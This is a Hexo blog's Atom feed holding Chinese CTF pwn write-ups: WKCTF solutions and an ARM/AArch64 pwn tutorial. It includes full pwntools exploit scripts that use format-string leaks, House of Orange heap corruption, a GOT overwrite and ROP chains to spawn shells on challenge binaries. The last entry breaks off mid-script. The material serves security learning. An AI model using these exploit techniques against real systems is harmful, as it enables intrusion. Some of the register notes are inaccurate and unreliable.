<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>tw11ty</title>
  
  <subtitle>A blog powered by Hexo</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-07-15T03:39:20.692Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>kkkk</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WKCTF-pwn</title>
    <link href="http://example.com/2024/07/15/WKCTF-pwn/"/>
    <id>http://example.com/2024/07/15/WKCTF-pwn/</id>
    <published>2024-07-15T03:33:07.000Z</published>
    <updated>2024-07-15T03:39:20.692Z</updated>
    
    <content type="html"><![CDATA[<h2 id="baby-stack"><a href="#baby-stack" class="headerlink" title="baby_stack"></a>baby_stack</h2><p>wait函数里面有个格式化字符串，多试几次能试出来offset&#x3D;20时拿到libc</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130699.png" alt="image-20240715112838945"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130615.png" alt="image-20240715112847331"></p><p>v2长度为256字节，此函数中的a1[256]会造成栈上的off by null</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130539.png" alt="image-20240715112855280"></p><p>布置的payload，rbp每次低字节为00</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130633.png" alt="image-20240715112903110"></p><p>可以用ret填，不过exp多打几次出了</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130098.png" alt="img"></p><pre class=" language-highlight Python"><span class="comment"><code class="language-highlight Python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    <span class="comment"># context.log_level = &#x27;info&#x27;</span>    IPort = <span class="string">&#x27;110.40.35.73 33750&#x27;</span>    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6&#x27;</span>     <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    rop  = ROP(pwnfile)    libc = ELF(libc_name)    io = init(pwnfile, IPort, libc_name)    sla(<span class="string">b&#x27;Press enter to continue\n&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)    sla(<span class="string">b&#x27;Pick a number: &#x27;</span>, <span class="built_in">str</span>(<span class="number">20</span>))    <span class="comment"># debug()</span>    ru(<span class="string">b&#x27;Your magic number is: &#x27;</span>)    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x401b40</span>    system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]    bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))    sla(<span class="string">b&#x27;How many bytes do you want to read (max 256)? &#x27;</span>, <span class="built_in">str</span>(<span class="number">256</span>))    <span class="comment"># sleep(1)</span>    prdi = <span class="number">0x000000000002164f</span> + libc_base    ppr  = <span class="number">0x0000000000021b33</span> + libc_base    payload = cyclic(<span class="number">152</span>) + p64(prdi) + p64(bin_sh) + p64(ppr) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(system)    payload = payload.ljust(<span class="number">256</span>, <span class="string">b&#x27;\x00&#x27;</span>)    <span class="comment"># debug()</span>    s(payload)    leak(<span class="string">"libc_base"</span>, libc_base)     itr()</code></pre><h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>House of orange，不过show()函数只能打印8字节数据，构造两次orange，将两块相同size区间的large chunk链到一起</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130370.png" alt="image-20240715112916443"></p><p>然后申请出前一块大的chunk，就能得到残留的heap指针，然后就是背板子</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130428.png" alt="image-20240715112927619"></p><p>最后布置好的fake_IO_FILE结构体</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151137538.png" alt="image-20240715113709496"></p><pre class=" language-highlight Python"><span class="comment"><code class="language-highlight Python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):    sla(<span class="string">b&#x27;>\n&#x27;</span>,<span class="built_in">str</span>(num))<span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;&#x27;</span></span>):    menu(<span class="number">1</span>)    sla(<span class="string">b&#x27;Size :\n&#x27;</span>,<span class="built_in">str</span>(size))    sla(<span class="string">b&#x27;Content :\n&#x27;</span>, content)<span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content=<span class="string">b&#x27;aaaa&#x27;</span></span>):    menu(<span class="number">2</span>)    sla(<span class="string">b&#x27;Index :\n&#x27;</span>, <span class="built_in">str</span>(idx))    sla(<span class="string">b&#x27;Size :\n&#x27;</span>, <span class="built_in">str</span>(size))    sa(<span class="string">b&#x27;Content :\n&#x27;</span>, content)<span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):    menu(<span class="number">3</span>)    sla(<span class="string">b&#x27;Index :\n&#x27;</span>, <span class="built_in">str</span>(idx))<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    <span class="comment"># context.log_level = &#x27;info&#x27;</span>    IPort = <span class="string">&#x27;110.40.35.73 33679&#x27;</span>    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>     <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    rop  = ROP(pwnfile)    libc = ELF(libc_name)    io = init(pwnfile, IPort, libc_name)    add(<span class="number">0xaf8</span>)   <span class="comment">#0</span>    edit(<span class="number">0</span>, <span class="number">0xb00</span> , <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xaf0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x501</span>))    <span class="comment"># p()</span>    add(<span class="number">0xb18</span>)   <span class="comment">#1</span>    <span class="comment"># p()</span>    edit(<span class="number">1</span>, <span class="number">0xb20</span> , <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>))    <span class="comment"># p()</span>    add(<span class="number">0xff0</span>)   <span class="comment">#2</span>    <span class="comment"># p()</span>    add(<span class="number">0xff0</span>)   <span class="comment">#3</span>    <span class="comment"># debug()</span>    <span class="comment"># p()</span>    add(<span class="number">0x4e0</span>-<span class="number">8</span>) <span class="comment">#4</span>    <span class="comment"># p()</span>    <span class="comment"># debug()</span>    show(<span class="number">4</span>)    heap_addr = uu64(r(<span class="number">8</span>)) - <span class="number">0x21b0a</span>        add(<span class="number">0x18</span>)    <span class="comment">#5</span>    show(<span class="number">5</span>)    libc_base = uu64(r64()) - <span class="number">0x3c4f0a</span>    leak(<span class="string">"libc_base"</span>, libc_base)       io_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]    system      = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]    payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) +  <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) + p64(io_list_all-<span class="number">0x10</span>)+p64(io_list_all-<span class="number">0x10</span>) +  p64(<span class="number">0</span>)+p64(<span class="number">1</span>) + p64(<span class="number">0</span>)*<span class="number">7</span> + p64(heap_addr+<span class="number">0x21b40</span>) +p64(<span class="number">0</span>)*<span class="number">13</span> + p64(heap_addr+<span class="number">0x21b40</span>+<span class="number">0xd8</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(system)    edit(<span class="number">5</span>, <span class="number">0x200</span>, payload)    leak(<span class="string">"heap_addr"</span>, heap_addr)     <span class="comment"># debug(&#x27;tele 0x004040E0 \n b*0x40157F &#x27;)</span>    itr()</code></pre><h2 id="something-changed"><a href="#something-changed" class="headerlink" title="something_changed"></a>something_changed</h2><p>aarch64的格式化字符串，远程是qemu起的（泄露几次发现栈地址固定），保护全关相当于是，而且这道题本身就没开FULL RELRO和pie。还给了backdoor</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151131796.png" alt="image-20240715112941715"></p><p>直接用一次性格式化字符串来改__stack_chk_fail_got为backdoor就行了</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130281.png" alt="image-20240715112949243"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151131895.png" alt="image-20240715112956706"></p><pre class=" language-highlight Python"><span class="comment"><code class="language-highlight Python"><span class="comment"># coding = utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    <span class="comment"># context.log_level = &#x27;info&#x27;</span>    context.arch = <span class="string">&#x27;aarch64&#x27;</span>    IPort = <span class="string">&#x27;120.79.91.95 3332&#x27;</span>    <span class="comment"># IPort = &#x27;127.0.0.1 12345&#x27;</span>    pwnfile = <span class="string">&#x27;./silent&#x27;</span>    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    libc = ELF(libc_name)    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-aarch64 -L ./ -g 12345 ./silent&#x27;</span>)    <span class="comment"># dbg("b *0x04007F4 \n b *0x000400854")</span>    <span class="comment"># dbg("b *0x000400854")</span>    scf = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]   <span class="comment">#14</span>    backdoor = <span class="number">0x00400770</span>    payload =  <span class="string">b&#x27;%1883c%c&#x27;</span> + <span class="string">b&#x27;%0c%0c%0c%0c%0c%0c%0c%c%c%c%c%c%c%c%c%c%c%caa%hn&#x27;</span>  + p64(scf)    sl(payload)    itr()<span class="comment">#canary   %19$p</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;baby-stack&quot;&gt;&lt;a href=&quot;#baby-stack&quot; class=&quot;headerlink&quot; title=&quot;baby_stack&quot;&gt;&lt;/a&gt;baby_stack&lt;/h2&gt;&lt;p&gt;wait函数里面有个格式化字符串，多试几次能试出来offset&amp;#x3D;2</summary>
      
    
    
    
    
    <category term="writewp" scheme="http://example.com/tags/writewp/"/>
    
  </entry>
  
  <entry>
    <title>arm-pwn入门</title>
    <link href="http://example.com/2024/07/12/arm-pwn%E5%85%A5%E9%97%A8/"/>
    <id>http://example.com/2024/07/12/arm-pwn%E5%85%A5%E9%97%A8/</id>
    <published>2024-07-12T13:02:32.000Z</published>
    <updated>2024-07-15T03:50:00.699Z</updated>
    
    <content type="html"><![CDATA[<p>一些师傅的博客：</p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16077191.html">关于学习arm架构下的pwn的总结 - ZikH26 - 博客园 (cnblogs.com)</a></p><p><a href="https://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/#arm-pwn%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD">arm pwn 入门 | blingbling’s blog (blingblingxuanxuan.github.io)</a></p><p><a href="https://sky123.blog.csdn.net/article/details/135730371?spm=1001.2014.3001.5502">IOT pwn_apt install mips-linux-CSDN博客</a></p><p><a href="https://bbs.kanxue.com/thread-272332.htm#msg_header_h2_1">[原创] CTF 中 ARM &amp; AArch64 架构下的 Pwn-Pwn-看雪-安全社区|安全招聘|kanxue.com</a> </p><p>也参考了许多其他师傅们的博客，这里不一一贴出来了。</p><p>最近刚好在看 《计算机组成原理（ Alan Clements ）》，以ARM体系架构为例，详细介绍其指令集、寄存器结构、指令执行流程等核心内容。对arm入门很有帮助。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>- <a href="#arm_reg">ARM寄存器集</a></p><p>- <a href="#arm_code">ARM指令集</a></p><p>- <a href="#env">ARM PWN环境搭建</a></p><ul><li><a href="#first">题目一：32位 arm架构 静态</a><ul><li><a href="#func">符号表恢复</a></li></ul></li><li><a href="#second">题目二：32位 arm架构 动态</a></li><li><a href="#third">题目三：64位 aarch64架构 动态</a></li><li><a href="#fourth">题目四：32位 arm ret2libc</a></li><li><a href="#obn">题目五：aarch64架构 off by null</a><ul><li><a href="#loc">本地交叉编译</a></li></ul></li><li><a href="#fmt">题目六：aarch64架构 格式化字符串</a></li></ul><h1 id="ARM寄存器集"><a href="#ARM寄存器集" class="headerlink" title="ARM寄存器集"></a>ARM寄存器集<a id="arm_reg"></a></h1><p>ARM指令集体系结构属于RISC（精简指令集） 32位 寄存器-寄存器型的体系结构，使用load&#x2F;stort指令在存储器与寄存器之间移动数据</p><p>具有规整的32位指令格式，不能够像Pentium那样的CISC处理器将地址以及16位或者32位数据加载到寄存器中。</p><p>ARM32寄存器集</p><ul><li>R0 存储临时变量 或者 函数返回值</li><li>R0~R3 四个寄存器存储函数调用时前4个参数 多余参数放到栈上</li><li>R7 系统调用号</li><li>R11寄存器即可以用来记录回溯信息,也可以当做局部变量来使用   –&gt; 相当于ebp   FP</li><li>R13 SP 指向栈顶</li><li>R14 LP 存放函数返回地址</li><li>R15   PC(程序计数器) IP    与x86不同的点在于PC在ARM状态下存储当前指令+8的地址。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407111228109.png" alt="image-20240711122858943"></p><p>当前状态处理器（CPSR）：Z（零） N（负） C（进位） V（溢出），低八位包含系统信息</p><p>aarch寄存器集</p><p>X0: 也称为零寄存器，用于存储函数的返回值、传递函数参数和临时存储变量。</p><p>X1-X7: 用于传递函数参数和临时存储变量。</p><p>X8: 也称为程序计数器(PC)，用于存储当前正在执行的指令的地址。当处理器执行一条指令时，PC会自动递增以指向下一条指令。</p><p>X9-X15: Caller Saved寄存器，用于存储函数参数、局部变量和临时数据。</p><p>X16-X17: 也称为临时寄存器，用于存储临时数据，这些寄存器在函数调用期间不需要保留其值。</p><p>X18: 也称为平台相关寄存器，用于存储与特定平台相关的信息，如TLS（线程本地存储）指针。</p><p>X19-X28: Callee Saved寄存器，于存储函数参数、局部变量和临时数据。</p><p>X29: 也称为帧指针寄存器（Frame Pointer，FP），用于存储当前函数的堆栈帧指针。当函数调用发生时，x29寄存器的值被保存到堆栈中，以便在函数执行期间可以轻松地访问上一级函数的堆栈帧。这样，当函数返回时，可以通过恢复x29寄存器的值来恢复到正确的堆栈帧。</p><p>X30: 也称为链接寄存器（Link Register，LR），用于存储函数调用的返回地址。当函数执行完毕时，处理器将使用x30寄存器中存储的返回地址来恢复到调用点。这样，控制流程可以顺利返回到调用函数的位置继续执行。</p><p>X31: SP 栈顶</p><h1 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集<a id="arm_code"></a></h1><p><strong>基础指令</strong></p><table><thead><tr><th>指令</th><th>功能</th><th>指令</th><th>功能</th></tr></thead><tbody><tr><td>MOV</td><td>移动数据</td><td>EOR</td><td>按位异或</td></tr><tr><td>MVN</td><td>移动数据并取反</td><td>LDR</td><td>加载</td></tr><tr><td>ADD</td><td>加法</td><td>STR</td><td>存储</td></tr><tr><td>SUB</td><td>减法</td><td>LDM</td><td>加载多个</td></tr><tr><td>MUL</td><td>乘法</td><td>STM</td><td>存储多个</td></tr><tr><td>LSL</td><td>逻辑左移</td><td>PUSH</td><td>入栈</td></tr><tr><td>LSR</td><td>逻辑右移</td><td>POP</td><td>出栈</td></tr><tr><td>ASR</td><td>算术右移</td><td>B</td><td>跳转</td></tr><tr><td>ROR</td><td>右旋</td><td>BL</td><td>Link+跳转</td></tr><tr><td>CMP</td><td>比较</td><td>BX</td><td>分支跳转</td></tr><tr><td>AND</td><td>按位与</td><td>BLX</td><td>Linx+分支跳转</td></tr><tr><td>ORR</td><td>按位或</td><td>SWI&#x2F;SVC</td><td>系统调用</td></tr></tbody></table><p><strong>条件分支</strong></p><table><thead><tr><th>编码</th><th>助记符</th><th>分支标志和状态</th><th>执行条件</th></tr></thead><tbody><tr><td>0000</td><td><strong>EQ</strong></td><td>z置位</td><td>相等  0</td></tr><tr><td>0001</td><td><strong>NE</strong></td><td>z清零</td><td>不等 !0</td></tr><tr><td>0010</td><td><strong>CS</strong></td><td>c置位</td><td>无符号大于等于</td></tr><tr><td>0011</td><td><strong>CC</strong></td><td>c清零</td><td>无符号小于</td></tr><tr><td>0100</td><td><strong>MI</strong></td><td>n置位</td><td>负</td></tr><tr><td>0101</td><td><strong>PL</strong></td><td>n清零</td><td>正或零</td></tr><tr><td>0110</td><td><strong>VS</strong></td><td>v置位</td><td>溢出</td></tr><tr><td>0111</td><td><strong>VC</strong></td><td>v清零</td><td>未溢出</td></tr><tr><td>1000</td><td><strong>HI</strong></td><td>c置位 z清零</td><td>无符号大于</td></tr><tr><td>1001</td><td><strong>LS</strong></td><td>c清零 z置位</td><td>无符号小于等于</td></tr><tr><td>1010</td><td><strong>GE</strong></td><td>n、v同时置位或清零</td><td>大于等于</td></tr><tr><td>1011</td><td><strong>LT</strong></td><td>n、v分别置位或清零</td><td>小于</td></tr><tr><td>1100</td><td><strong>GT</strong></td><td>z清零 n、v同时置位或清零</td><td>大于</td></tr><tr><td>1101</td><td><strong>LE</strong></td><td>z置位 n、v分别置位或清零</td><td>小于等于</td></tr><tr><td>1110</td><td><strong>AL</strong></td><td></td><td>总是</td></tr><tr><td>1111</td><td><strong>NV</strong></td><td></td><td>从不</td></tr></tbody></table><p>ARM通过块移动实现一个非常复杂的栈结构</p><blockquote><p>test STMFD r13!, {r0-r4, r10, r14} ;保存工作寄存器，并将返回地址保存在r14中</p><p>​       ……</p><p>​       LDMFD r13!, {r0-r4, r10, r15} ; 恢复工作寄存器，把r14送入PC中</p></blockquote><h1 id="ARM-PWN环境搭建"><a href="#ARM-PWN环境搭建" class="headerlink" title="ARM PWN环境搭建"></a>ARM PWN环境搭建<a id="env"></a></h1><p>基础环境安装可看这位师傅<a href="https://binlep.github.io/old_blog_01/2020/03/20/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E8%B7%A8%E5%B9%B3%E5%8F%B0%E6%9E%B6%E6%9E%84%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E8%B0%83%E8%AF%95/">【Pwn 笔记】跨平台架构的环境配置与调试 | binLep’s Blog</a>，写得很详细</p><p>使用qemu构建一个虚拟环境来运行arm文件，使用gdb-multiarch连接到qemu，进行远程调试</p><p>AArch64：是ARMv8及更高版本中引入的64位架构。而qemu-arm用于模拟32位的ARM架构的二进制文件，qemu-aarch64用于模拟64位的ARM aarch64架构的二进制文件</p><blockquote><p>wARMup: ELF 32-bit LSB executable, <strong>ARM</strong>, EABI5 version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-linux-armhf.so.3, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;fbe5794e95d6ea5006ea3137c0120ed945acae17, not stripped   –&gt; qemu-arm模拟</p><p>shanghai_baby_arm: ELF 64-bit LSB executable, <strong>ARM aarch64</strong>, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-linux-aarch64.so.1, for GNU&#x2F;Linux 3.7.0, BuildID[sha1]&#x3D;e988eaee79fd41139699d813eac0c375dbddba43, stripped  –&gt; qemu-aarch模拟</p></blockquote><p>qemu进行模拟时使用-L加载对应架构的链接库（在usr目录下）</p><pre class=" language-highlight shell"><code class="language-highlight shell">qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu/ ./pwnqemu-arm -g 8888 -L /usr/arm-linux-gnueabihf/ ./pwn</code></pre><p>然后启动gdb-multiarch：</p><pre class=" language-highlight shell"><code class="language-highlight shell">set architecture arm/aarch64  #指定目标架构target remote localhost:1234/8888</code></pre><p><strong>运行pwn脚本时附加进程</strong>：</p><p>1.给程序加个pause()，qemu模拟时设置-g port，然后gdb-multiarch附加上去。</p><p>2.向群u请教后，可以通过pwntools中的attach附加进程上去。但是好像只能在程序交互前attach上去，不然会无法交互</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">io = process(&#x27;qemu-arm -L ./ -g 2222 pwnfile&#x27;.split(&#x27; &#x27;), env=env)gdb.attach((&#x27;127.0.0.1&#x27;, 2222), &#x27;&#x27;&#x27;b *_start&#x27;&#x27;&#x27;, exe=&#x27;pwnfile&#x27;)sleep(2)</code></pre><p>端口冲突：netstat -lnp查看占用PID    kill -9 PID 删除进程 </p><p><strong>一些有关qemu的知识</strong>：qemu起的虚拟环境保护全关。关闭了ASLR：启动的地址是固定的；关闭了NX：shellcode可执行。通过判断远程环境是qemu起的还是实体机起的，如果是qemu一般直接用ret2shellcode，否则泄露+attack。即使所给的二进制文件开了NX和pie，也只是对真机环境有效，qemu中还是没有保护。</p><h1 id="题目一：32位-arm架构-静态"><a href="#题目一：32位-arm架构-静态" class="headerlink" title="题目一：32位 arm架构 静态"></a>题目一：32位 arm架构 静态<a id="first"></a></h1><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121123677.png" alt="image-20240712112344579"></p><pre class=" language-highlight shell"><code class="language-highlight shell">qemu-arm -g 1234 ./typogdb-multiarch ./typo<span class="meta prompt_">pwndbg> </span><span class="language-bash"><span class="built_in">set</span> architecture arm</span><span class="meta prompt_">pwndbg> </span><span class="language-bash">target remote localhost:1234</span></code></pre><p>由于是静态链接，所以函数会会很乱，定位主函数方法：</p><ol><li>通过字符串找到一些特征字符串，题目中的描述之类的，根据交叉调用，不断跟进父函数，判断当前函数是否为主函数</li><li>定位_start函数，分析_start调用，它最终会调用mian函数或者是封装的__libc_start_main函数</li></ol><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121143318.png" alt="image-20240712114313268"></p><p>发现sub_8F00为main函数</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121338981.png" alt="image-20240712133835929"></p><p>然后边调边逆，猜测一些函数作用 </p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121534727.png" alt="image-20240712152641078"></p><p>在0x221c8处下断点</p><p>在循环中，函数会断在该处，输入0x200字节数据</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121341151.png" alt="image-20240712134108103"></p><p>调用完read以后，断点下在0x00008d60</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121354166.png" alt="image-20240712135409083"></p><p>R11 -&gt;  0xfffef064 —▸ 0x9058 ◂— str r0, [fp, #-0x20] &#x2F;* ‘ ‘ *&#x2F;  ，0x9058指令是readin()的下一条指令，当我们覆盖了0xfffef064中的值为布置好的shellcode地址，就能控制程序在调用完readin()后，通过r11来恢复恢复PC。偏移为0x70字节</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">pwndbg> p/x 0xfffef064-0xfffeeff4$1 = 0x70</code></pre><p>由于没有开NX保护，栈上shellcode可执行，可以控制R11 -&gt; shellcode_addr，但是shellcode写到栈上，需要栈地址，不过qemu起的环境没开ASLR，可以直接用栈地址返回。</p><p>通过ROPgadget来打，构造ROP链，执行system(“&#x2F;bin&#x2F;sh”)，或者execve(“&#x2F;bin&#x2F;sh”, 0, 0)</p><p>首先我们需要知道：arm函数调用参数规则：R0~R4，再是栈上，R7为系统调用号，r15&#x3D;PC指向下一条命令地址</p><p>execve系统调用号0xb，挟持PC执行svc中断，使用ROPgadget找不到pop r15的gadget</p><blockquote><p>execve(“&#x2F;bin&#x2F;sh”, 0, 0)   –&gt;  r0 &#x3D; bin_sh_addr   r1&#x3D;0   r2&#x3D;0   r7&#x3D;b</p><p>pc &#x3D; svc_addr </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121418124.png" alt="image-20240712141834090"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121449651.png"></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">0x00020904 : pop &#123;r0, r4, pc&#125;0x00068bec : pop &#123;r1, pc&#125;0x00014068 : pop &#123;r7, pc&#125;0x0004df00 : mov r2, #0 ; mov r0, r2 ; pop &#123;r3, r4, r5, pc&#125;0x0000fed0 : svc #0 ; pop &#123;r3, r4, r5, r6, r7, pc&#125;</code></pre><p>然后就是把他们组装起来</p><pre class=" language-highlight python"><span class="keyword">from</span> pwn <span class="keyword"><code class="language-highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *context(arch=<span class="string">&#x27;arm&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)io = process([<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;./typo&#x27;</span>])io.sendlineafter(<span class="string">b&#x27;quit\n&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)<span class="comment"># 0x00020904 : pop &#123;r0, r4, pc&#125;</span><span class="comment"># 0x00068bec : pop &#123;r1, pc&#125;</span><span class="comment"># 0x00014068 : pop &#123;r7, pc&#125;</span><span class="comment"># 0x0004df00 : mov r2, #0 ; mov r0, r2 ; pop &#123;r3, r4, r5, pc&#125;</span><span class="comment"># 0x0000fed0 : svc #0 ; pop &#123;r3, r4, r5, r6, r7, pc&#125;</span>r0_r4 =  <span class="number">0x00020904</span>r1    = <span class="number">0x00068bec</span>r7    = <span class="number">0x00014068</span>r3_r4_r5 = <span class="number">0x0004df00</span>  <span class="comment">#r0=r2=0</span>svc   = <span class="number">0x0000fed0</span>bin_sh= <span class="number">0x0006C384</span>payload = flat([ cyclic(<span class="number">112</span>), p32(r3_r4_r5), p32(<span class="number">0</span>)*<span class="number">3</span>,   <span class="comment">#r2 = 0</span>                p32(r0_r4), p32(bin_sh) , p32(<span class="number">0</span>),        <span class="comment">#r0 = bin_sh_addr</span>                p32(r1), p32(<span class="number">0</span>),                         <span class="comment">#r1 = 0</span>                p32(r7), p32(<span class="number">0xb</span>),                       <span class="comment">#r7 = 0xb</span>                p32(svc)])                               <span class="comment">#pc = svc_addr</span>io.recv()io.sendline(payload)io.interactive()</code></pre><h2 id="恢复符号表"><a href="#恢复符号表" class="headerlink" title="恢复符号表"></a><strong>恢复符号表</strong><a id="func"></a></h2><p>看了winmt师傅的文章，可以使用<a href="https://github.com/Reverier-Xu/Rizzo-IDA">Rizzo</a>插件来修复符号表:</p><ol><li>先将对应的libc.so下载下来</li><li>然后用IDA打开libc.so，使用Rizzo导出为libc.so.riz</li><li>打开目标程序，使用Rizzo加载.riz</li></ol><p>但是本地没加载出来   ~_~   </p><p>需要知道编译的libc版本才能修复，网上找的libc是<a href="https://launchpad.net/ubuntu/bionic/arm64/libc6/2.27-3ubuntu1">2.27-3ubuntu1 : libc6 : arm64 : Bionic (18.04) : Ubuntu (launchpad.net)</a>，可能是libc找错了</p><p>尝试用了阿里公开的<a href="https://github.com/aliyunav/Finger">finger</a>函数识别插件分析，貌似arm架构的函数识别不出来。。。</p><p>也试了下<a href="https://github.com/push0ebp/sig-database">sig-database</a>里面提供的sig文件，利用ida自带的FLIRT进行签名，2.23到2.27都试了一通，只匹配出来三个函数，2.28+作者没有构建arm架构的sig文件了。</p><p>很是让人郁闷，不过学习了很多恢复符号表的方法。^-^</p><h1 id="题目二：32位-arm架构-动态"><a href="#题目二：32位-arm架构-动态" class="headerlink" title="题目二：32位 arm架构 动态"></a>题目二：32位 arm架构 动态<a id="second"></a></h1><p>InCTF-2018 wARMup</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121507370.png" alt="image-20240712150714341"></p><p>没开pie   32位arm架构bss段可执行</p><p>主函数溢出0x10字节</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121510197.png" alt="image-20240712151053165"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121550049.png" alt="image-20240712155049004"></p><p>read通过r11-0x68来设置目标地址，如果我们设置函数的返回地址为0x1052c，控制R11的值，就能实现任意地址写</p><p>函数最后会将SP指针向低地址减少4字节，后面执行的 POP {R11, PC} 从SP开始，所以填充的payload长度应该为 $r11 - $r1 -4 &#x3D; 0x64，后面四字节为R11，接下来才会弹给PC。</p><p>先构造任意写，往bss段上写shellcode，然后再改返回函数地址执行shellcode</p><pre class=" language-highlight python"><span class="keyword">from</span> pwn <span class="keyword"><code class="language-highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *context(arch=<span class="string">&#x27;arm&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)<span class="comment"># io = process(&#x27;qemu-arm -L /usr/arm-linux-gnueabihf/ -g 4444 ./wARMup&#x27;, shell = True)</span>io = process(<span class="string">&#x27;qemu-arm -L /usr/arm-linux-gnueabihf/ ./wARMup&#x27;</span>, shell = <span class="literal">True</span>)bss = <span class="number">0x021100</span>payload = flat([cyclic(<span class="number">0x64</span>), p32(bss+<span class="number">0x68</span>),   <span class="comment">#r11 -> bss</span>                p32(<span class="number">0x01052C</span>)                  <span class="comment">#read(0, bss-0x68, 0x78)</span>                